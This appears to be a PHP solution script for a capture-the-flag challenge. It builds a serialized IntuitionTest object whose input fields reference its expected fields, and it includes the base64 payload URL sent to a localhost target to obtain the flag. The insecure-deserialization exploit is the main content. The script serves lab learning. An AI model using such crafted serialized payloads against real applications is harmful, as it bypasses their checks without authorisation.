<?php

// The goal is to have the expected values equal to the input values
// Notice that parameter i is a serialized object of the class IntuitionTest by decoding it from base64
// From that we can assume there may be insecure deserialization


// First create a class with the required variables
class IntuitionTest
{
    var $name;
    var $expected_R;
    var $expected_G;
    var $expected_B;
    var $input_R;
    var $input_G;
    var $input_B;
}

// Create a new object of the class
$obj = new IntuitionTest();

// Set variable name to whatever you want
$obj->name = "up to u";

// use PHP reference (&) so that the input values are the same as the expected values.
// in PHP, when you assign a reference to a variable, both the original variable and the reference point to the same memory location. 
// so, any changes made to one of them will reflect in the other.
$obj->input_R = &$obj->expected_R;
$obj->input_G = &$obj->expected_G;
$obj->input_B = &$obj->expected_B;
$obj->expected_R = rand(0, 255);
$obj->expected_G = rand(0, 255);
$obj->expected_B = rand(0, 255);

echo serialize($obj);
echo "\n\n";
echo base64_encode(serialize($obj)); // place this in the GET parameter i
echo "\n\n";

// cannot do type juggling because it uses '===' to compare the values
if ($obj->expected_R === $obj->input_R && $obj->expected_G === $obj->input_G && $obj->expected_B === $obj->input_B)
    echo "we get the FLAG";
else
    echo "no flag";
?>

<!-- 

Output:

O:13:"IntuitionTest":7:{s:4:"name";s:7:"up to u";s:10:"expected_R";i:156;s:10:"expected_G";i:22;s:10:"expected_B";i:119;s:7:"input_R";R:3;s:7:"input_G";R:4;s:7:"input_B";R:5;}

TzoxMzoiSW50dWl0aW9uVGVzdCI6Nzp7czo0OiJuYW1lIjtzOjc6InVwIHRvIHUiO3M6MTA6ImV4cGVjdGVkX1IiO2k6MTU2O3M6MTA6ImV4cGVjdGVkX0ciO2k6MjI7czoxMDoiZXhwZWN0ZWRfQiI7aToxMTk7czo3OiJpbnB1dF9SIjtSOjM7czo3OiJpbnB1dF9HIjtSOjQ7czo3OiJpbnB1dF9CIjtSOjU7fQ==

we get the FLAG 


payload:
http://localhost:1337/index.php?i=TzoxMzoiSW50dWl0aW9uVGVzdCI6Nzp7czo0OiJuYW1lIjtzOjc6InVwIHRvIHUiO3M6MTA6ImV4cGVjdGVkX1IiO2k6MTU2O3M6MTA6ImV4cGVjdGVkX0ciO2k6MjI7czoxMDoiZXhwZWN0ZWRfQiI7aToxMTk7czo3OiJpbnB1dF9SIjtSOjM7czo3OiJpbnB1dF9HIjtSOjQ7czo3OiJpbnB1dF9CIjtSOjU7fQ==

-->
